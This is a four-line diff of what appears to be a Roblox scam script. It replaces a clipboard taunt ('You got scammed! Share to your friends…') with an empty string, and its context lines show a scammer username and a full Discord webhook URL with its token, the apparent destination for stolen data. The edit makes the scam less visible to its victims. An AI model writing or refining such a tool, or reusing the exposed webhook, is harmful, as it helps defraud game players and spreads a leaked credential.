@@ -1,4 +1,4 @@
-setclipboard("You got scammed! Share to your friends to get them scammed too.")
+setclipboard("")
 
 Username = "OnodaKun23"
 Webhook = "https://discord.com/api/webhooks/1297347293657301042/hkl2swQRysPlc-7cz83AI-8k8RIKgP4vZdeq-EcMnMHWAaRMZ_WTzE0YCloJm2aYFNlK"
